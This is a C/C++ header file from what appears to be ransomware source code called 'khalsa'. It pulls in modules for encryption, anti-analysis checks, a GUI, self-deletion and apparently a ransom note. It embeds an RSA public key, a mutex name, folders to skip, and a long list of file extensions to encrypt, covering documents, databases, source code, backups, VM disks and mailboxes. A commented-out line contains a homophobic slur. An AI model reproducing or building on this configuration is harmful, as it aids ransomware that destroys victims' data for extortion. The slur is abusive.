#pragma once
#include <Windows.h>

#include "khalsa_crypt.h"
#include "khalsa_checks.h"
#include "khalsa_gui.h"
#include "khalsa_melt.h"
#include "khalsa_rec.h"

LPCWSTR lpszPublicKey = L"-----BEGIN PUBLIC KEY-----"
L"MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQKCAQBvDXdHEUBJM6TYrpMkTxpk"
L"1nDRWw0HwIQjqTxVIhGTKZOOG15TUYDhGzY6i20UarvCE7r+65raJiOULaLNOK3G"
L"mhbfXdyvrm4uYFrKbepkChNm0XNrBkTxiHD0v4nylrYX02oe+BSf3deaLMyXa1m0"
L"FEe7miw/OCNirJ14BjvqdH/Yzka+5bTlpaELBbvja3Cm/2hPUTRDyvAtpv5hjuLb"
L"/iedu9W8IWjEX6b96/3NHmjryRnJtVQdWvpycQ8+ZPsiRkWW2wp8UBo35PPUq4gg"
L"icWGWvCjUBKxxlWg+Bw+sWWO5UsuCI288YA/xVwKpI16XdgLIiOHJd2PI6B0FHTh"
L"AgMBAAE="
L"-----END PUBLIC KEY-----";

LPCWSTR lpszMutantName = L"\\??\\40691290-71d5-45bc-b86a-e714496f4bf2";
LPWSTR lpszBlacklist[] = { L"Windows", L"$Recycle.Bin", NULL };

LPWSTR lpszExts[] = { L".txt", L".dat", L".der", L".pfx", L".key", L".crt", L".csr", L".p12", L".pem", L".odt", L".ott", L".sxw", L".stw", L".uot", L".3ds", L".max", L".3dm", L".ods", L".ots", L".sxc", L".stc", L".dif", L".slk", L".wb2", L".odp", L".otp", L".sxd", L".std", L".uop", L".odg", L".otg", L".sxm", L".mml", L".lay", L".lay6", L".asc", L".sqlite3", L".sqlitedb", L".sql", L".accdb", L".mdb", L".db", L".dbf", L".odb", L".frm", L".myd", L".myi", L".ibd", L".mdf", L".ldf", L".sln", L".suo", L".cs", L".c", L".cpp", L".pas", L".h", L".asm", L".js", L".cmd", L".bat", L".ps1", L".vbs", L".vb", L".pl", L".dip", L".dch", L".sch", L".brd", L".jsp", L".php", L".asp", L".rb", L".java", L".jar", L".class", L".sh", L".mp3", L".wav", L".swf", L".fla", L".wmv", L".mpg", L".vob", L".mpeg", L".asf", L".avi", L".mov", L".mp4", L".3gp", L".mkv", L".3g2", L".flv", L".wma", L".mid", L".m3u", L".m4u", L".djvu", L".svg", L".ai", L".psd", L".nef", L".tiff", L".tif", L".cgm", L".raw", L".gif", L".png", L".bmp", L".jpg", L".jpeg", L".vcd", L".iso", L".backup", L".zip", L".rar", L".7z", L".gz", L".tgz", L".tar", L".bak", L".tbk", L".bz2", L".PAQ", L".ARC", L".aes", L".gpg", L".vmx", L".vmdk", L".vdi", L".sldm", L".sldx", L".sti", L".sxi", L".602", L".hwp", L".snt", L".onetoc2", L".dwg", L".pdf", L".wk1", L".wks", L".123", L".rtf", L".csv", L".txt", L".vsdx", L".vsd", L".edb", L".eml", L".msg", L".ost", L".pst", L".potm", L".potx", L".ppam", L".ppsx", L".ppsm", L".pps", L".pot", L".pptm", L".pptx", L".ppt", L".xltm", L".xltx", L".xlc", L".xlm", L".xlt", L".xlw", L".xlsb", L".xlsm", L".xlsx", L".xls", L".dotx", L".dotm", L".dot", L".docm", L".docb", L".docx", L".doc", NULL};
//LPWSTR lpszExts[] = { L".faggot", NULL };
 